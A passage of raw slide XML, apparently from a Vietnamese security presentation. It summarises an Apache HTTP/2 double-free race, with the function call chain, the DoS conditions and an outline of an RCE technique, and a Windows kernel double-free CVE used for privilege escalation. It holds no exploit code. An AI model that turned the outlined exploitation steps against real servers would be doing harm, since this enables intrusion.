            <a:ext cx="0" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="2807208"/>
            <a:ext cx="3236976" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>on_frame_recv_cb và on_stream_close_cb</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6190488" y="3429000"/>
            <a:ext cx="0" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="3648456"/>
            <a:ext cx="3236976" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>cả hai gọi h2_mplx_c1_client_rst</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6190488" y="4270248"/>
            <a:ext cx="0" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="4489704"/>
            <a:ext cx="3236976" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>m_stream_cleanup đẩy cùng h2_stream vào mảng cleanup 2 lần</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6190488" y="5111496"/>
            <a:ext cx="0" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="5330952"/>
            <a:ext cx="3236976" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>h2_stream_destroy free lần 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8266176" y="1417320"/>
            <a:ext cx="3465576" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8449056" y="1581912"/>
            <a:ext cx="3099816"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TÁC ĐỘNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8449056" y="1874520"/>
            <a:ext cx="3099816" cy="2176272"/>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chemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DoS từ xa: 1 kết nối TCP, 2 frame, không xác thực</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RCE khi APR dùng mmap allocator: fake h2_stream, trỏ cleanup của pool tới system(), payload ở scoreboard</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8266176" y="4389120"/>
            <a:ext cx="3465576" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8449056" y="4553712"/>
            <a:ext cx="30998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ĐIỀU KIỆN KHAI THÁC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8449056" y="4846320"/>
            <a:ext cx="3099816" cy="1261872"/>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chemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>HTTP/2 bật + MPM đa luồng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RCE cần thêm info leak và heap spray (đã chứng minh trong lab)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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CVE-2025-62215 · Windows Kernel</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4 · CWE-362 + CWE-415 · CVSS 3.1 = 7.0 HIGH</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5522976" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1581912"/>
            <a:ext cx="5120640" cy="22860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RACE CONDITION → DOUBLE FREE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="2103120"/>
            <a:ext cx="2194560" cy="64008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Thread A</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3474720" y="2103120"/>
            <a:ext cx="2194560" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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Thread B</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="2743200"/>
            <a:ext cx="0" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="2743200"/>
            <a:ext cx="0" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3108960"/>
            <a:ext cx="2194560" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free(obj)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3474720" y="3108960"/>
            <a:ext cx="2194560" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free(obj)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="3749040"/>
            <a:ext cx="914400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3657600" y="3749040"/>
            <a:ext cx="914400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011680" y="4206240"/>
            <a:ext cx="2377440" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>kernel object</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="5166360"/>
            <a:ext cx="4983480" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Đồng bộ sai: cả hai thread cùng thấy object còn sống và cùng giải phóng nó</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1417320"/>
            <a:ext cx="2647188" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="158191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SẢN PHẨM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="1874520"/>
            <a:ext cx="2281428" cy="89611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Windows Kernel: Windows 10/11, Server 2019–2025 chưa vá</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9084564" y="1417320"/>
            <a:ext cx="2647188" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="1581912"/>
            <a:ext cx="2281428"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TÁC ĐỘNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="1874520"/>
            <a:ext cx="2281428" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Leo quyền cục bộ lên SYSTEM; bị khai thác dạng zero-day</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="3108960"/>
            <a:ext cx="5522976" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="327355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NGUYÊN NHÂN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="3566160"/>
            <a:ext cx="5157216" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Đồng bộ sai tài nguyên dùng chung trong kernel (race condition), cho phép cùng một đối tượng kernel bị giải phóng hai lần</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="4800600"/>
            <a:ext cx="2647188" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5161"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="4965192"/>
            <a:ext cx="2281428"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ĐIỀU KIỆN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
